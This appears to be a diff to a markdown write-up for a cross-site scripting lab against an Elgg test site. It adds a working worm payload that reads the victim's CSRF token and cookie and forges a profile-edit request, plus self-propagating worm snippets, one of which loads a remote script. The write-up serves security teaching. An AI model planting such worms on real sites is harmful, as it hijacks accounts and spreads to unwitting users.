@@ -264,15 +264,17 @@ __elgg_token=e14473d4037a91b83100066cf70b8dce
 
 
 
-Now we can forge an AJAX-request using javascript in a separate .js file
+Now we can forge an AJAX-request using javascript
 
-```js
+```html
+<script id="worm">
 'use strict';
-const CONTENT = "__elgg_token="+elgg.security.token.__elgg_token+
-                "&__elgg_ts="+elgg.security.token.__elgg_ts+
-                "&name="+elgg.session.user.name+
+
+const CONTENT = "__elgg_token="+escape(elgg.security.token.__elgg_token)+
+                "&__elgg_ts="+escape(elgg.security.token.__elgg_ts)+
+                "&name="+escape(elgg.session.user.name)+
                 "&description="+escape("<script>alert('I am a worm!!');</script>")+
-                "&guid="+elgg.session.user.guid;
+                "&guid="+escape(elgg.session.user.guid);
 
 let Ajax = new XMLHttpRequest();
 Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
@@ -282,13 +284,36 @@ Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.
 Ajax.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 Ajax.setRequestHeader("Accept-Encoding", "gzip, deflate");
 Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
-Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/"+elgg.session.user.username+"/edit");
-Ajax.setRequestHeader("Cookie", "Elgg=j6fk84knlhmpkfleu4g0hg9ad5");
+Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/"+escape(elgg.session.user.username)+"/edit");
+Ajax.setRequestHeader("Cookie", "Elgg="+escape(document.cookie));
 Ajax.setRequestHeader("Connection", "keep-alive");
 Ajax.setRequestHeader("Upgrade-Insecure-Requests", "1");
 Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 Ajax.setRequestHeader("Content-Length", CONTENT.length);
 Ajax.send(CONTENT);
+</script>
 ```
+
+
+
+#### Task6: Writing a Self-Propagating XSS Worm
+
+The propagating mechanism can use one of the following two approaches:
+**ID Approach** - *required*
+
+```html
+<script id=worm>
+  	let strCode = document.getElementById("worm");
+    alert(strCode.innerHTML);
+</script>
+```
+
+**Src Approach**
+
+```html
+<script type="text/javascript" src="http://example.com/xss_worm.js"></script>
+```
+
+
 
